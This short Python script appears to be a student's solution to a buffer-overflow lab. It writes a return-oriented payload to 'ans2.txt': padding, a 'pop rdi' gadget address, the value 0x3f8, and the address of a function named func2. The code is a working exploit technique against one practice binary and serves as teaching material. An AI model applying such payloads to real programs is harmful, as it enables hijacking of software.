import struct

padding_len = 16
target_val = 0x3f8
pop_rdi_addr = 0x4012c7
func2_addr  = 0x401216  # func2 的地址

payload = b'A' * padding_len
payload += struct.pack('<Q', pop_rdi_addr) 
payload += struct.pack('<Q', target_val)  
payload += struct.pack('<Q', func2_addr)  

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload 'ans2.txt' generated successfully!")